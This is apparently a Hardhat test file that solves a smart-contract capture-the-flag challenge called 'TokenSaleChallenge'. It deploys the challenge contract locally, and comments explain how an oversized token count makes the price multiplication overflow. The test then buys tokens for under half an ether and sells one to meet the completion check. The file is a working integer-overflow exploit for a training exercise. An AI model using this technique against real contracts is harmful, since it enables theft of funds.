const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "TokenSaleChallenge";

describe(NAME, function () {
    describe("exploit", async function () {
        let victimContract;

        it("conduct your attack here", async function () {
            const [owner, attackerWallet] = await ethers.getSigners();
            const VictimFactory = await ethers.getContractFactory(NAME);
            victimContract = await VictimFactory.deploy(attackerWallet.address, {value: ethers.utils.parseEther("1")});



            //From version 0.8.0 a transaction will revert if an overflow is detected
            //even without the use of external libraries or extra checks.

            //Make 'numTokens * PRICE_PER_TOKEN' - overflow by passing corresponding 'numTokens'
            //This way we could pass small msg.value for a large amount of tokens.

            //(MAX_UINT / 10^18) + 1= 115792089237316195423570985008687907853269984665640564039458
            //Multiplying it by 10^18 will result in an overflow of 415992086870360064, a little bit below half an ether
            await victimContract.connect(attackerWallet).buy(ethers.BigNumber.from("115792089237316195423570985008687907853269984665640564039458"),
                                                        {value: ethers.utils.parseUnits("415992086870360064", "wei")});

            await victimContract.connect(attackerWallet).sell(1);
        });

        after(async function () {
            expect(await victimContract.isComplete()).to.be.equal(true);
        });
    });
});